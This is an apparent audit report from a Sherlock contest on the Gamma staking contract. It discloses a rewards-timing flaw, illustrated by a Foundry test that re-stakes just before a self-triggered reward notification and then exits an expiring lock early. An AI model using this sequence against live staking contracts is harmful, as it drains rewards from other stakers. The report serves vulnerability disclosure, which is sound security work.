# Users can use their expiring locks to increase their rewards right before a rewards notification

## Summary
Users can front-run rewards notification and withdraw earlier than expected as long as they have other locks that are close to expire.

https://github.com/sherlock-audit/2024-05-gamma-staking/blob/main/StakingV2/src/Lock.sol#L349-L371

## Vulnerability Detail
* Bob stakes an amount X for the minimum duration.
* Bob waits for an interesting variation in rewards that happens close to the end of his lock cycle
* Bob then skates the same amount X again right before rewards notifications (can be triggered by him) and initiates a late exit for his first lock.
* Bob withdraws his first lock amount as soon as possible (could be as low as 1 second)

## Impact
Increase rewards at the expense of other stakers while being able to withdraw earlier than expected. 

## Code Snippet
```solidity
    function testRewards() public {
        vm.startPrank(user1);
        lock.stake(1 ether, user1, 0);

        vm.startPrank(user2);
        lock.stake(1 ether, user2, 0);

        skip(lockPeriod[0] - 1);

        assertEq(lock.calcRemainUnlockPeriod(lockList.getLock(user1, 0)), 1); // Remaining lock time should be 1 second

        vm.startPrank(deployer);
        _rewardToken.mint(address(lock), 1 ether);

        vm.startPrank(user1);
        lock.stake(1 ether, user1, 2);

        lock.notifyUnseenReward(rewardTokens);

        lock.getAllRewards();

        lock.exitLateById(0);

        skip(1);

        lock.withdrawUnlockedTokenById(0);
    }
```

## Tool used
Manual Review

## Recommendation
Not sure how to mitigate this without having a global per user cooldown on late exists / withdrawals.
